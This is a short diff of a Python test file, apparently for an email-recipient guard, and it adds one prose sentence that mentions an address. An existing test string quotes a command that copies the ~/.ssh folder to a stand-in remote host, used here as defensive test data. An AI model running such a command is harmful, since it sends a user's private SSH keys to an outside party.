@@ -259,6 +259,7 @@ def test_a_recorded_untrusted_destination_blocks_in_every_spelling_a_client_read
     "Contact me at bob@corp.example for the details.",
     "Ask the blue team to detect scp -r ~/.ssh a@b.example:/tmp/ within the hour.",
     "a@b.example and c@d.example are both on the thread <",
+    "Please send the report to bob@corp.example.",
 ])
 def test_prose_that_mentions_an_address_is_not_a_recipient_list(value):
     """Only junk or a display name may surround the mailbox in a part that does
